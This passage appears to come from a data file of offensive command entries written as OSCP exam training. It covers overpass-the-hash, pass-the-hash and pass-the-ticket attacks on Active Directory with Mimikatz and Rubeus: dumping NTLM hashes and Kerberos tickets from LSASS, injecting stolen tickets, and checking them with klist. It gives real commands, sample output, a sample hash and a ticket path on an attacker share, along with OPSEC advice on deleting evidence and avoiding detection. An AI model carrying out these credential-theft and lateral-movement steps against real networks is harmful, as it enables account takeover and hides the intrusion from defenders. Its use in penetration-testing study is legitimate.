krbtgt/CORP.COM @ CORP.COM
        KerbTicket Encryption Type:
AES-256-CTS-HMAC-SHA1-96

#1>     Client:
jen @ CORP.COM
        Server:
cifs/files04 @ CORP.COM
        KerbTicket Encryption Type:
AES-256-CTS-HMAC-SHA1-96
```

Confirms TGT (#0, Server:
krbtgt) and TGS (#1, Server:
cifs/files04) created.

WHY TRIGGER IS NECESSARY:
Overpass-the-hash is TWO-STEP process:
Step 1:
sekurlsa::pth injects credentials into LSASS
Step 2:
Trigger Kerberos authentication to REQUEST TGT from KDC

sekurlsa::pth does NOT automatically create TGT.

It only sets up credential context.

You must explicitly trigger Kerberos authentication.

WHAT ""TRIGGER"" MEANS:
Any operation that requires network authentication to domain resource:
- net use \\hostname
- dir \\hostname\share
- Get-Content \\hostname\path\file.txt
- Test-Path \\hostname\share
- PsExec.exe \\hostname cmd (auto-triggers)

These operations cause Windows to:
1.

Detect need for authentication to domain resource
2.

Check ticket cache (empty after sekurlsa::pth)
3.

Request TGT from KDC using injected credentials
4.

Request TGS for specific service
5.

Cache both tickets for reuse

HOSTNAME REQUIREMENT (CRITICAL):
Kerberos requires HOSTNAME, not IP address.

Correct:
```powershell
net use \\files04
```

Incorrect:
```powershell
net use \\192.168.50.73
```

Why?
Kerberos uses Service Principal Names (SPNs) format:
- service/hostname@DOMAIN
- Example:
cifs/files04@CORP.COM

SPN cannot be constructed from IP address.

DNS resolution maps hostname → IP, but SPN needs hostname.

SERVICE PRINCIPAL NAMES (SPNs):
Different services have different SPNs:
- CIFS/SMB:
cifs/hostname (file shares)
- HTTP:
http/hostname (web services)
- LDAP:
ldap/hostname (directory services)
- HOST:
host/hostname (general services)
- MSSQL:
MSSQLSvc/hostname:port (SQL Server)

Trigger for CIFS:
net use \\hostname
Trigger for HTTP:
Invoke-WebRequest http://hostname
Trigger for LDAP:
Get-ADUser (domain queries)

TICKET CREATION FLOW:
1.

net use \\files04 executed
2.

Windows detects domain resource access needed
3.

Checks Kerberos ticket cache for existing cifs/files04 ticket
4.

No ticket found, checks for TGT
5.

No TGT found, requests TGT from KDC:
   a.

AS-REQ (Authentication Service Request) to KDC
   b.

Pre-authentication:
Timestamp encrypted with jen's hash (injected by Mimikatz)
   c.

KDC validates pre-auth with jen's stored hash
   d.

AS-REP (Authentication Service Reply):
TGT issued
6.

TGT cached (#0 in klist output)
7.

Using TGT, requests TGS for cifs/files04:
   a.

TGS-REQ (Ticket Granting Service Request) to KDC
   b.

Presents TGT as proof of identity
   c.

KDC issues service ticket for cifs/files04
   d.

TGS-REP:
Service ticket returned
8.

TGS cached (#1 in klist output)
9.

Service ticket presented to files04 for access
10.

Connection succeeds

TWO TICKETS CREATED:
Ticket #0 - TGT (Ticket Granting Ticket):
- Server:
krbtgt/CORP.COM
- Purpose:
Request service tickets
- Lifetime:
10 hours (default)
- Renewable:
7 days (default)
- Encryption:
AES-256 or RC4

Ticket #1 - TGS (Ticket Granting Service):
- Server:
cifs/files04
- Purpose:
Access specific service on specific host
- Lifetime:
10 hours (default)
- Service-specific:
Only works for CIFS on files04

ALTERNATIVE TRIGGER COMMANDS:
From new PowerShell (spawned by sekurlsa::pth):
File access:
```powershell
dir \\files04\c$
```

Test connection:
```powershell
Test-Path \\files04\c$
```

Explicit authentication:
```powershell
.\PsExec.exe \\files04 cmd
```

Any will trigger TGT request.

VERIFICATION:
Always verify with klist after trigger:
```powershell
klist
```

Success indicators:
- Cached Tickets:
(2) or more
- Client:
jen @ CORP.COM (impersonated user)
- Server:
krbtgt/CORP.COM (TGT exists)
- Server:
cifs/files04 (service ticket exists)

Failure indicators:
- Cached Tickets:
(0)
- No tickets displayed
- Client still shows original user

If no tickets:
1.

Verify sekurlsa::pth completed successfully
2.

Verify running commands in Mimikatz-spawned PowerShell (not original)
3.

Check hostname used (not IP)
4.

Verify network connectivity to DC (port 88)
5.

Check time synchronization (must be <5 min difference with DC)

NETWORK PATH FORMATS:
UNC paths for triggering:
- \\hostname (default share discovery)
- \\hostname\share (specific share)
- \\hostname\share\path\file (specific file)
- \\hostname.domain.com (FQDN works too)
- \\hostname (short name sufficient if DNS resolves)

NOT triggering Kerberos:
- \\192.168.50.73 (IP address - falls back to NTLM)
- C:\local\path (local file system)
- Localhost or 127.0.0.1 (local machine)

PORT REQUIREMENTS:
- TCP/UDP 88:
Kerberos (KDC communication)
- TCP/UDP 53:
DNS (hostname resolution)
- TCP 445:
SMB (if using net use for files)

KDC COMMUNICATION:
KDC = Key Distribution Center (runs on Domain Controller):
- Handles TGT requests (AS)
- Handles TGS requests (TGS)
- Validates pre-authentication
- Issues tickets

From training, KDC is domain controller (DC1 typically).

TIME ESTIMATE:
- net use \\hostname:
2-5 seconds
- TGT/TGS request:
<3 seconds
- klist verification:
<5 seconds
- Total:
<10 seconds

EXAM STRATEGY:
1.

After sekurlsa::pth, IMMEDIATELY trigger Kerberos
2.

Use simple trigger:
net use \\<DC_HOSTNAME>
3.

Verify with klist before proceeding
4.

If no tickets, troubleshoot before continuing
5.

Common issue:
Using IP instead of hostname

COMMON ERRORS:
System error 5 - Access denied:
- Hash invalid or user lacks permissions
- Verify hash correctness
- Check user account status (disabled?)

The network path was not found:
- Hostname not resolvable via DNS
- Check DNS resolution:
nslookup hostname
- Verify hostname spelling
- Try FQDN:
\\files04.corp.com

No tickets after successful net use:
- Not running in Mimikatz-spawned PowerShell
- Close and use the NEW PowerShell window
- Credentials only injected in spawned process

IP address used:
- Change to hostname immediately
- Kerberos will NOT work with IP
- NTLM fallback may occur (defeats purpose)

FORENSIC ARTIFACTS:
- Event ID 4768:
Kerberos TGT request (on DC)
- Event ID 4769:
Kerberos TGS request (on DC)
- Event ID 4624:
Network logon Type 3 (on target)
- Network traffic on port 88 (to DC)
- SMB traffic on port 445 (to target)

KERBEROS VS NTLM FALLBACK:
If hostname not used:
- Windows attempts Kerberos first
- SPN lookup fails (no hostname)
- Falls back to NTLM authentication
- Defeats purpose of overpass (wanted Kerberos)

Always use hostname to ensure Kerberos used.","high"
"kerberos-klist-verify","Kerberos - List Cached Tickets (klist)","active-directory","klist","Display cached Kerberos TGT and TGS tickets for current session","lateral-movement","OSCP TRAINING MATERIAL - VERIFY KERBEROS TICKETS WITH KLIST:
TRAINING EXAMPLE (FROM OSCP MODULE):
After overpass-the-hash and triggering Kerberos:
```powershell
PS C:\Tools> klist

Current LogonId is 0:0x11e387b

Cached Tickets:
(2)

#0>     Client:
jen @ CORP.COM
        Server:
krbtgt/CORP.COM @ CORP.COM
        KerbTicket Encryption Type:
AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time:
5/16/2022 18:30:12
        End Time:
  5/17/2022 4:30:12
        Renew Time:
5/23/2022 18:30:12

#1>     Client:
jen @ CORP.COM
        Server:
cifs/files04 @ CORP.COM
        KerbTicket Encryption Type:
AES-256-CTS-HMAC-SHA1-96
```

WHAT IS KLIST:
Built-in Windows command (part of Windows OS since Windows 2000) that displays cached Kerberos tickets for current logon session.

No installation required, always available.

TICKET TYPES:
Ticket #0 - TGT (Ticket Granting Ticket):
- Server:
krbtgt/DOMAIN (krbtgt is special Kerberos service account)
- Purpose:
Request service tickets from KDC
- Lifetime:
10 hours default (configurable via GPO)
- Renewable:
7 days default
- Most important ticket - can request any service ticket

Ticket #1+ - TGS (Ticket Granting Service / Service Tickets):
- Server:
service/hostname @ DOMAIN
- Purpose:
Access specific service on specific server
- Examples:
cifs/files04 (file access), http/web01 (web), ldap/dc1 (directory)
- Service-specific:
Cannot reuse for different service/host

WHY VERIFY TICKETS:
- Confirm overpass-the-hash succeeded
- Check ticket exists before lateral movement (avoid wasted attempts)
- Verify ticket not expired
- Identify which services accessible
- Troubleshoot authentication issues

KEY FIELDS EXPLAINED:
Client:
- Shows WHO the ticket is for
- jen @ CORP.COM = Ticket grants jen's access
- Should match user from overpass/pass-the-ticket

Server:
- Shows WHAT SERVICE the ticket grants access to
- krbtgt = TGT (can request other tickets)
- cifs/hostname = File share access
- http/hostname = Web service access

KerbTicket Encryption Type:
- AES-256-CTS-HMAC-SHA1-96:
Modern, secure (preferred)
- AES-128-CTS-HMAC-SHA1-96:
Modern, acceptable
- RC4-HMAC (0x17):
Legacy, weak (essentially NTLM hash)
- DES:
Very old, deprecated

Ticket Flags:
- forwardable:
Ticket can be forwarded to other services
- renewable:
Ticket can be renewed before expiration
- initial:
First authentication (TGT from password/hash)
- pre_authent:
Pre-authentication performed

Start Time:
- When ticket becomes valid
- Usually immediate

End Time:
- When ticket expires
- Default:
Start Time + 10 hours
- After End Time:
Ticket invalid, must re-authenticate

Renew Time:
- Maximum lifetime if renewed
- Default:
Start Time + 7 days
- Can request renewal before End Time

LogonId:
- Unique identifier for logon session
- Format:
0:0xHEXVALUE
- Tickets tied to specific logon session
- Different sessions have different ticket caches

COMMON VERIFICATION SCENARIOS:
After overpass-the-hash:
```powershell
klist
```
Expect:
- Cached Tickets:
(2+)
- Client:
impersonated_user @ DOMAIN
- Server:
krbtgt/DOMAIN (TGT)
- Server:
cifs/target or service/target (TGS)

After pass-the-ticket:
```powershell
klist
```
Expect:
- New ticket appears in list
- Client shows stolen ticket's user
- Server shows service from imported ticket

TROUBLESHOOTING WITH KLIST:
Cached Tickets:
(0)
- No Kerberos authentication performed
- Overpass not triggered (missing net use step)
- Wrong PowerShell session (not Mimikatz-spawned)
- Tickets purged

Client shows wrong user:
- Tickets from different session
- Overpass failed
- Pass-the-ticket not injected correctly

Server doesn't match target:
- Wrong service ticket
- Need different ticket for target service
- May need to trigger additional authentication

Ticket expired (current time > End Time):
- Re-authenticate to get new ticket
- Or renew if within Renew Time

ADVANCED KLIST COMMANDS:
klist tgt:
- Show only TGT tickets
- Filters out service tickets

klist purge:
- Delete ALL cached tickets
- Requires admin or affects only current user
- Used for cleanup/OPSEC

klist sessions:
- Show all logon sessions
- Displays LogonId for each

klist -lh 0 -li 0x3e7:
- Query specific logon session
- Useful for viewing other users' tickets (requires SYSTEM)

WHAT KLIST DOESN'T SHOW:
- Password or hash
- Ticket encryption keys
- Full ticket contents (use Mimikatz for export)
- Tickets from other logon sessions (unless admin)

TIME ESTIMATE:
- Execution:
<5 seconds
- Output review:
10-20 seconds

EXAM STRATEGY:
1.

Run klist AFTER every Kerberos operation
2.

Verify tickets before lateral movement attempts
3.

Check End Time - don't use expired tickets
4.

If no tickets, troubleshoot before proceeding
5.

Screenshot klist output for documentation

COMMON MISTAKES:
- Forgetting to verify after overpass-the-hash
- Using expired tickets (check End Time!)
- Checking klist in wrong PowerShell window
- Expecting whoami to show ticket user (use klist Client field instead)","high"
"passticket-mimikatz-export","Pass-the-Ticket - Export Tickets (Mimikatz)","active-directory","mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export","Export all cached Kerberos tickets to .kirbi files for reuse on other systems","lateral-movement","OSCP TRAINING MATERIAL - PASS-THE-TICKET EXPORT WITH MIMIKATZ:
TRAINING EXAMPLE (FROM OSCP MODULE):
Scenario:
dave has access to \\web04\backup, jen does not.

Goal:
Steal dave's ticket and use it as jen.

From CLIENT74 as jen (with admin rights), export all tickets:
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::tickets /export

[...]
* Saved to file [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
* Saved to file [0;3e7]-2-0-40e10000-dave@krbtgt-CORP.COM.kirbi
[...]
```

Training shows multiple .kirbi files created, including dave's TGS for CIFS service on web04.

WHAT IS PASS-THE-TICKET:
Lateral movement technique that steals and reuses existing Kerberos tickets from one session/machine and injects them into another, enabling access without knowing passwords or hashes.

KEY DISTINCTION FROM OTHER TECHNIQUES:
- Pass-the-Hash:
Uses NTLM hash for authentication
- Overpass-the-Hash:
Converts NTLM hash to TGT
- Pass-the-Ticket:
Steals and reuses existing Kerberos tickets

Pass-the-Ticket advantage:
No hash needed, just steal live tickets.

TRAINING SCENARIO CONTEXT:
- dave:
Domain user with access to \\web04\backup
- jen:
Domain user, local admin on CLIENT74, NO access to \\web04\backup
- CLIENT74:
Windows client where both dave and jen have sessions
- Goal:
jen steals dave's ticket to access \\web04\backup

HOW TICKET EXPORT WORKS:
1.

Mimikatz accesses LSASS process (requires privilege::debug)
2.

Reads Kerberos ticket cache from memory
3.

Extracts tickets from all active logon sessions
4.

Saves each ticket as .kirbi file (Mimikatz format)
5.

Tickets written to current directory

WHY TICKETS ARE VALUABLE:
- Tickets grant access without passwords
- Can be moved to different machines
- Can be injected into different user sessions
- Portable authentication credentials
- Time-limited but reusable until expiration

KIRBI FILENAME FORMAT (FROM TRAINING):
```
[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

Breakdown:
- [0;12bd0]:
LUID (Logon Session ID) - identifies source session
- 0:
Group number
- 0:
Type (0=TGS service ticket, 2=TGT)
- 40810000:
Flags (hex)
- dave:
Username
- cifs-web04:
Service (CIFS) and hostname (web04)
- .kirbi:
Mimikatz format

TICKET TYPES IN EXPORT:
TGT (Ticket Granting Ticket):
- Filename pattern:
[LUID]-2-0-FLAGS-user@krbtgt-DOMAIN.kirbi
- Example:
[0;3e7]-2-0-40e10000-dave@krbtgt-CORP.COM.kirbi
- Server:
krbtgt
- Purpose:
Request service tickets
- Most valuable - can request any service ticket

TGS (Service Tickets):
- Filename pattern:
[LUID]-0-0-FLAGS-user@service-host.kirbi
- Example:
[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
- Server:
specific service/host
- Purpose:
Access specific service on specific server
- Service-specific:
Only works for that service/host combination

From training, dave's CIFS ticket for web04 was the target:
```
[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

This ticket grants file share access (CIFS) to web04 as dave.

MULTIPLE SESSIONS EXPORTED:
Mimikatz exports tickets from ALL logon sessions on the system:
- Interactive logins (users at keyboard)
- RDP sessions
- Service accounts
- Network authentications
- RunAs sessions

Typical export yields:
- Dozens to hundreds of .kirbi files
- Tickets from multiple users
- Mix of TGT and TGS tickets
- Current and expired tickets

FINDING VALUABLE TICKETS:
From training, after export:
```powershell
PS C:\Tools> dir *.kirbi
```

Look for:
- High-privilege users (domain admins, server admins)
- TGT tickets (most flexible)
- Service tickets to target systems
- Tickets with future End Time (not expired)

FROM TRAINING:
Identified dave's ticket by:
1.

Looking for username (dave)
2.

Looking for target service/host (cifs-web04)
3.

Checking it's dave's ticket for web04 access

PRIVILEGE REQUIREMENTS:
Export requires:
- Administrator privileges on current system
- privilege::debug enabled (SeDebugPrivilege)
- Access to LSASS process

From training:
jen was local admin on CLIENT74, enabling ticket export.

NO ADMIN REQUIRED ON TARGET:
Important:
Admin needed on SOURCE (export machine), NOT target.
- Export:
Admin on CLIENT74 (current machine)
- Inject:
No admin needed (current user session)
- Use:
Depends on ticket permissions

KIRBI FILE PORTABILITY:
Once exported:
- .kirbi files are portable
- Can be copied to USB/network
- Can be moved to different machines
- Can be injected into any Windows session
- Cross-machine lateral movement enabled

EXPORT OUTPUT EXAMPLES:
From training, Mimikatz shows:
```
 * Saved to file [0;3e7]-2-0-40e10000-dave@krbtgt-CORP.COM.kirbi
 * Saved to file [0;3e7]-2-1-40e10000-dave@ldap-DC1.CORP.COM.kirbi
 * Saved to file [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

Each line indicates successful ticket export.

LOGON SESSION IDS (LUID):
- [0;3e7]:
System session (LUID 0x3e7 = 999 decimal)
- [0;12bd0]:
User session (dave's interactive login)
- Different LUIDs = different logon sessions
- Same user can have multiple LUIDs (multiple sessions)

TIME LIMIT ON TICKETS:
Exported tickets retain original expiration:
- TGT:
Typically 10 hours from issue
- TGS:
Typically 10 hours from issue
- Check End Time after export
- Expired tickets = useless

Verify ticket validity:
```powershell
mimikatz # kerberos::list /export
```
Shows expiration before export.

MANUAL ALTERNATIVE:
No Windows-native tool exports tickets:
- Mimikatz required for export
- Rubeus alternative:
Rubeus.exe dump
- klist shows tickets but cannot export

Rubeus export:
```
Rubeus.exe dump /service:krbtgt /nowrap
```
Outputs base64, not .kirbi files.

SECURITY IMPLICATIONS:
- Ticket theft doesn't trigger password change notifications
- Legitimate ticket usage - hard to detect
- No failed authentication logs
- Stealthier than password attacks

TIME ESTIMATE:
- Export execution:
5-10 seconds
- File review/identification:
1-2 minutes
- Total:
2-3 minutes

EXAM STRATEGY:
1.

Gain admin on compromised system
2.

Export ALL tickets immediately (sekurlsa::tickets /export)
3.

Identify high-value tickets (domain admins, service accounts)
4.

Identify tickets to target systems
5.

Inject relevant tickets for lateral movement
6.

Store .kirbi files for later use

COMMON FAILURES:
privilege::debug FAILED:
- Not running mimikatz as Administrator
- Right-click mimikatz.exe → Run as administrator

No tickets exported:
- No active Kerberos sessions on system
- Wait for users to login
- Or trigger authentication (runas, net use, etc.)

ERROR kuhl_m_sekurlsa_acquireLSA:
- LSASS Protected Process Light (PPL) enabled
- Advanced protection - may need bypass
- Try different system

FORENSIC ARTIFACTS:
- Mimikatz execution traces
- LSASS process access (Event ID 10, Sysmon)
- .kirbi files on disk (unless deleted)
- File creation timestamps
- Process creation (Event ID 4688)

OPSEC CONSIDERATIONS:
- Delete .kirbi files after injection
- Use memory-only methods when possible
- Mimikatz leaves traces in memory scanners
- Consider Rubeus as less-detected alternative","high"
"passticket-mimikatz-inject","Pass-the-Ticket - Inject Ticket (Mimikatz)","active-directory","mimikatz # kerberos::ptt <TICKET_FILE>.kirbi","Inject exported .kirbi Kerberos ticket into current session for impersonation","lateral-movement","OSCP TRAINING MATERIAL - PASS-THE-TICKET INJECT WITH MIMIKATZ:
TRAINING EXAMPLE (FROM OSCP MODULE):
Continuing from Pass-the-Ticket export scenario:
Scenario:
jen (lacking access) injects dave's ticket (has access) to reach \\web04\backup.

From CLIENT74 as jen, after exporting tickets:
```
mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi

* File:
'[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi':
OK
```

Success message confirms injection.

Verify injection:
```powershell
PS C:\Tools> klist

Cached Tickets:
(1)

#0>     Client:
dave @ CORP.COM
        Server:
cifs/web04 @ CORP.COM
        KerbTicket Encryption Type:
AES-256-CTS-HMAC-SHA1-96
```

Ticket now cached as jen, but grants dave's access.

Test access:
```powershell
PS C:\Tools> ls \\web04\backup

    Directory:
\\web04\backup

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/16/2022   1:11 PM          11541 backup.txt
```

Success! jen accessed \\web04\backup using dave's stolen ticket.

WHAT IS PASS-THE-TICKET INJECTION:
Taking exported Kerberos ticket (.kirbi file) and loading it into current Windows session's ticket cache, enabling authentication as the ticket owner without their password or hash.

CRITICAL UNDERSTANDING:
After injection:
- whoami:
Still shows jen (process identity)
- klist:
Shows dave's ticket (authentication identity)
- Network access:
Authenticates as dave (ticket owner)
- File operations to \\web04\backup:
Succeed as dave

Identity split:
- Local identity:
jen (process token)
- Network identity:
dave (Kerberos ticket)

TRAINING SCENARIO BREAKDOWN:
Before injection:
- jen attempts:
ls \\web04\backup
- Result:
Access denied (jen lacks permissions)

After injection:
- jen attempts:
ls \\web04\backup (same command)
- Result:
Success (dave's ticket used for authentication)

No password needed, no hash needed - just stolen ticket.

HOW TICKET INJECTION WORKS:
1.

Mimikatz kerberos::ptt reads .kirbi file
2.

Parses Kerberos ticket structure
3.

Injects ticket into current session's ticket cache (via LsaCallAuthenticationPackage API)
4.

Windows Kerberos provider accepts ticket as legitimate
5.

Subsequent authentication uses injected ticket

WHY THIS WORKS:
Windows doesn't validate HOW ticket was obtained:
- Legitimate:
User authenticated, KDC issued ticket
- Stolen:
Mimikatz injected ticket from file
- Windows treats both identically
- No verification of ticket source
- Ticket contains all necessary cryptographic proof

NO ADMIN REQUIRED (CRITICAL ADVANTAGE):
Unlike Pass-the-Hash:
- Pass-the-Hash:
Requires admin (LSASS access for injection)
- Pass-the-Ticket (inject):
NO admin required
- Can inject into current user session
- Can steal from OWN session and reuse

From training:
jen used her own tickets (as local admin) but could also use stolen tickets without admin if exporting from own session.

TICKET SERVICE MATCHING:
Ticket service MUST match target:
From training:
- Ticket:
dave@cifs-web04.kirbi
- Service:
CIFS (file shares)
- Host:
web04
- Works for:
\\web04\* file access
- Does NOT work for:
\\web04 HTTP, \\files04 CIFS, etc.

Service examples:
- cifs/hostname:
File share access (SMB/CIFS)
- http/hostname:
Web services
- ldap/hostname:
Directory services
- host/hostname:
Generic host services
- mssql/hostname:
SQL Server

TICKET TYPES FOR INJECTION:
TGS (Service Ticket) - Like training example:
- Specific service + host
- Immediate use
- Limited scope
- Example:
dave@cifs-web04.kirbi

TGT (Ticket Granting Ticket) - Most valuable:
- Can request ANY service ticket
- Flexible
- Example:
dave@krbtgt-CORP.COM.kirbi
- After injection, can access any service as dave

From training scenario, TGS was sufficient (only needed web04 access), but TGT would enable broader access.

MIMIKATZ INJECTION COMMAND:
```
mimikatz # kerberos::ptt <FILENAME>.kirbi
```

Alternative syntax:
```
mimikatz # kerberos::ptt /ticket:<FILENAME>.kirbi
```

Both work identically.

INJECTION VERIFICATION:
Always verify with klist:
```powershell
klist
```

Success indicators:
- Cached Tickets:
(N) where N increased
- New ticket appears in list
- Client:
Shows ticket owner (dave)
- Server:
Shows service (cifs/web04)

Failure indicators:
- No new tickets
- Error message from Mimikatz
- File not found

TESTING INJECTED TICKET:
From training:
```powershell
ls \\web04\backup
```

Attempt access to resource ticket should grant.

Success:
- Directory listing appears
- No ""Access denied"" error
- Operations complete normally

Failure:
- Access denied:
Ticket wrong service/expired/invalid
- Network path not found:
Hostname resolution issue
- Logon failure:
Ticket expired or invalid

TICKET LIFETIME AND EXPIRATION:
Injected tickets retain original expiration:
- Original End Time preserved
- No extension via injection
- Check klist for End Time
- Expired ticket = useless

From training:
Tickets typically 10-hour lifetime.

If ticket expired:
- Cannot use (KDC rejects)
- Must obtain fresh ticket
- Export tickets immediately after compromise

CROSS-SESSION INJECTION:
Tickets can be:
- Exported from dave's session
- Injected into jen's session
- Used on same machine
- Or moved to different machine

Portability:
- .kirbi file contains full ticket
- Platform-independent (Windows only)
- Machine-independent
- Network-transferable

MULTIPLE TICKET INJECTION:
Can inject multiple tickets:
```
mimikatz # kerberos::ptt ticket1.kirbi
mimikatz # kerberos::ptt ticket2.kirbi
mimikatz # kerberos::ptt ticket3.kirbi
```

Each adds to cache:
- klist shows all injected tickets
- Multiple users/services accessible
- No limit on concurrent tickets

FILE PATH HANDLING:
Relative path:
```
mimikatz # kerberos::ptt ticket.kirbi
```
Looks in current directory.

Absolute path:
```
mimikatz # kerberos::ptt C:\Temp\ticket.kirbi
```

Netw ork path:
```
mimikatz # kerberos::ptt \\attacker\share\ticket.kirbi
```

TROUBLESHOOTING:
File not found:
- Check current directory:
dir *.kirbi
- Use full path
- Verify filename spelling (case-sensitive in some contexts)

Ticket import failed:
- .kirbi file corrupted
- Re-export from source
- Try different ticket

Access still denied after injection:
- Ticket expired:
Check klist End Time
- Wrong service:
Verify ticket service matches target
- Wrong host:
Verify ticket hostname matches target
- Ticket invalid:
Re-export fresh ticket

MANUAL ALTERNATIVE:
Rubeus provides alternative:
```
Rubeus.exe ptt /ticket:ticket.kirbi
```

Same functionality, different tool.

Advantage:
- Rubeus less detected than Mimikatz
- More modern codebase
- Better OPSEC features

TIME ESTIMATE:
- Injection:
5-10 seconds
- Verification (klist):
5 seconds
- Test access:
10-30 seconds
- Total:
<1 minute

EXAM STRATEGY:
1.

Export tickets from compromised systems
2.

Identify valuable tickets (high-privilege users, target services)
3.

Inject relevant tickets into your session
4.

Verify with klist
5.

Test access immediately
6.

If success, proceed with exploitation
7.

If failure, try different ticket or troubleshoot

COMPARISON TO OTHER TECHNIQUES:
Pass-the-Hash:
- Requires:
NTLM hash
- Privilege:
Admin (for injection)
- Scope:
NTLM authentication
- Tools:
Mimikatz, Impacket

Overpass-the-Hash:
- Requires:
NTLM hash
- Privilege:
Admin (for Mimikatz)
- Scope:
Kerberos authentication
- Result:
Generates new TGT

Pass-the-Ticket:
- Requires:
Existing ticket
- Privilege:
None (for injection into own session)
- Scope:
Specific service or TGT
- Result:
Reuses stolen ticket

Pass-the-Ticket advantages:
- No password/hash needed
- No admin required (for injection)
- Stealthier (reuses legitimate ticket)
- Works across machines

FORENSIC ARTIFACTS:
- Mimikatz execution (if used)
- .kirbi file on disk (unless deleted)
- Kerberos authentication events (Event ID 4769 on target)
- No new TGT request (reuses existing)
- Ticket appears in klist output

OPSEC CONSIDERATIONS:
- Delete .kirbi files after injection
- Use Rubeus instead of Mimikatz (less detected)
- Inject tickets only when needed
- Clear tickets after use (klist purge)
- Stolen ticket usage looks legitimate (hard to detect)","high"
"passticket-rubeus-ptt","Pass-the-Ticket - Rubeus PTT","active-directory","Rubeus.exe ptt /ticket:<TICKET_FILE>.kirbi","Inject .kirbi ticket using Rubeus (alternative to Mimikatz)","lateral-movement","EDUCATIONAL CONTEXT:
Rubeus provides modern alternative to Mimikatz for pass-the-ticket.

WHY RUBEUS:
More actively maintained, better OPSEC features.

TIME ESTIMATE:
<1 minute.

EXAM TIP:
Rubeus and Mimikatz both work - use whichever available.","high"
"overpass-rubeus-asktgt","Overpass-the-Hash - Rubeus asktgt","active-directory","Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /rc4:<NTLM_HASH> /ptt","Request TGT using NTLM hash with Rubeus (alternative to Mimikatz sekurlsa::pth)","lateral-movement","EDUCATIONAL CONTEXT:
Rubeus directly requests TGT using hash (cleaner than Mimikatz method).

WHY USE THIS:
Single command vs Mimikatz multi-step.

TIME ESTIMATE:
<1 minute.

EXAM TIP:
Rubeus asktgt more reliable than Mimikatz sekurlsa::pth.","high"
"kerberos-purge-tickets","Kerberos - Purge All Tickets","active-directory","klist purge","Clear all cached Kerberos tickets from current session","lateral-movement","EDUCATIONAL CONTEXT:
Clean up ticket cache for OPSEC or testing.

WHY USE:
Remove evidence of ticket injection, prepare clean state.

TIME ESTIMATE:
<5 seconds.

EXAM TIP:
Use between testing different stolen tickets.","medium"
"kerberos-troubleshoot-time","Kerberos - Troubleshoot Time Skew","active-directory","net time \\<DC>","Check time synchronization between client and DC (Kerberos requires <5 min skew)","lateral-movement","EDUCATIONAL CONTEXT:
Kerberos requires client and DC time within 5 minutes (default).

WHY IMPORTANT:
Time skew causes KDC_ERR_SKEW error, all Kerberos auth fails.

COMMON ISSUE:
VMs with suspended state, isolated networks without NTP.

FIX:
net time \\<DC> /set /yes synchronizes to DC time.

TIME ESTIMATE:
<10 seconds check, <30 seconds fix.

EXAM TIP:
If Kerberos mysteriously fails, check time first - common troubleshooting step.","medium"
"pth-mimikatz-sekurlsa","Pass-the-Hash - Mimikatz sekurlsa::pth","active-directory","mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:powershell","Launch process with user's NTLM hash using Mimikatz from compromised Windows host","lateral-movement","OSCP TRAINING MATERIAL - PASS-THE-HASH WITH MIMIKATZ:
WHAT IS PASS-THE-HASH:
Lateral movement technique that exploits how NTLM authentication works.

Instead of cracking password, use the NTLM hash directly for authentication.

The vulnerability isn't in NTLM protocol itself (which legitimately accepts hashes), but in unauthorized access to password hashes.

THREE PREREQUISITES (FROM TRAINING):
1.

Valid NTLM hash from compromised user

2.

SMB connection to target (port 445 accessible)

3.

User must have local administrator privileges on target

HOW NTLM AUTHENTICATION WORKS:
NTLM uses challenge-response mechanism:
1.

Client requests authentication

2.

Server sends challenge (random number)

3.

Client encrypts challenge with NTLM hash (NOT password)

4.

Server verifies encrypted challenge

Because authentication uses hash directly, possessing the hash = possessing the password.

MIMIKATZ SEKURLSA::PTH TECHNIQUE:
Mimikatz injects NTLM hash into LSASS process memory, creating new logon session:
  mimikatz # privilege::debug
  mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell

This spawns new PowerShell process with jen's credentials injected.

WHOAMI BEHAVIOR (CRITICAL UNDERSTANDING):
When you run whoami in the new PowerShell, it shows ORIGINAL user (e.g., jeff), NOT impersonated user (jen).

This is EXPECTED behavior because:
- whoami checks current process token (shows jeff)
- Network authentication uses injected credentials (uses jen)
- Verify with:
dir \\files04\c$ (should succeed as jen)

2014 UAC REMOTE RESTRICTIONS (MS14-068):
- RID 500 Administrator:
PTH works normally
- Other local admin accounts:
PTH BLOCKED by UAC filtering
- Domain users with local admin rights:
PTH works (bypass UAC restrictions)

This is why training uses domain user 'jen' with local admin rights.

BEHIND THE SCENES:
1.

privilege::debug enables SeDebugPrivilege (required for LSASS access)

2.

Creates new logon session (LUID)

3.

Injects NTLM hash into new session's credential structure

4.

Spawns process (/run:powershell) in context of new session

5.

Process inherits authentication token containing hash

OBTAINING HASHES:
- Mimikatz:
sekurlsa::logonpasswords (from memory)
- Mimikatz:
lsadump::sam (from SAM database)
- secretsdump.py (remote or local SAM/LSA dump)
- CrackMapExec:
--sam, --lsa flags

MANUAL VERIFICATION:
From new PowerShell window, test network authentication:
  net use \\files04\c$  # Should succeed without password prompt
  dir \\files04\c$      # Should list contents

COMPARISON TO IMPACKET TOOLS:
- Mimikatz PTH:
  Runs ON compromised Windows host, creates local process

- Impacket PTH:
  Runs FROM Kali, connects remotely to Windows target

- Use Mimikatz when you have RDP/shell on Windows box
- Use Impacket when attacking remotely from Kali

Time:
2-3 minutes (hash dump + verification + execution)

EXAM STRATEGY:
1.

Always verify hash with crackmapexec BEFORE attempting exploitation

2.

Test with simple command (dir \\target\c$) before complex payloads

3.

Remember whoami behavior - don't panic when it shows wrong user

4.

Prefer domain users over local admins (bypass UAC restrictions)

FORENSIC ARTIFACTS:
- Event ID 4624:
